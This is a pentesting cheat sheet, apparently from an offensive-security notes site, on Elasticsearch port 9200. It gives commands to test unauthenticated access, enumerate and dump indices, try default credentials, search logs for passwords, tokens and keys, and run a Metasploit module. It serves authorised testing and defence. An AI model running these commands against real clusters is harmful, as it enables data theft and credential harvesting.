# Elasticsearch (9200)

!!! tip "Start here"
    Test unauthenticated access first: `curl http://10.10.10.10:9200/`. If it returns a JSON banner with cluster info, you have full read access to every index. Elasticsearch prior to 8.x shipped with security disabled by default — internal deployments are almost always unauthenticated.

---

## Enumeration

```bash
nmap -p 9200 -sV --script http-enum 10.10.10.10
curl -s http://10.10.10.10:9200/                         # cluster banner, version
curl -s http://10.10.10.10:9200/_cluster/health          # cluster state
curl -s http://10.10.10.10:9200/_cat/indices?v           # list all indices
curl -s http://10.10.10.10:9200/_cat/nodes?v             # cluster nodes
```

---

## Dumping Data

Dump an entire index (up to 10k hits per request):

```bash
curl -s 'http://10.10.10.10:9200/<index>/_search?size=10000&pretty' > index_dump.json
```

Search for specific content across all indices:

```bash
curl -s 'http://10.10.10.10:9200/_search?q=password&size=100&pretty'
curl -s 'http://10.10.10.10:9200/_search?q=api_key&pretty'
```

For large indices, use the scroll API or `elasticdump`:

```bash
elasticdump --input=http://10.10.10.10:9200/<index> --output=index.json --type=data
```

---

## Authenticated Access

If basic auth is enabled:

```bash
curl -u elastic:<pass> http://10.10.10.10:9200/_cat/indices?v
```

Default/common credentials worth trying: `elastic:changeme`, `elastic:elastic`, `kibana:changeme`.

---

## Credential and Secret Hunting

Elasticsearch indices are a gold mine for passive credential discovery — logs, audit records, and forwarded syslog often contain cleartext secrets:

```bash
# Common fields to search
curl -s 'http://10.10.10.10:9200/_search?q=authorization&pretty'
curl -s 'http://10.10.10.10:9200/_search?q=bearer&pretty'
curl -s 'http://10.10.10.10:9200/_search?q=aws_access_key&pretty'
curl -s 'http://10.10.10.10:9200/_search?q=ssh-rsa&pretty'
```

---

## Metasploit Module

```bash
msfconsole
use auxiliary/scanner/elasticsearch/indices_enum
set RHOSTS 10.10.10.10
run
```

!!! tip "Real-world"
    Unauthenticated Elasticsearch shows up constantly on internal networks — it's usually the backend for Kibana, ELK stack logging, or application search. The indices themselves often contain more sensitive data than the production databases they're indexed from: full request bodies, error traces with session tokens, and historical log data that predates any security review. Always dump the indices list first and grep offline.
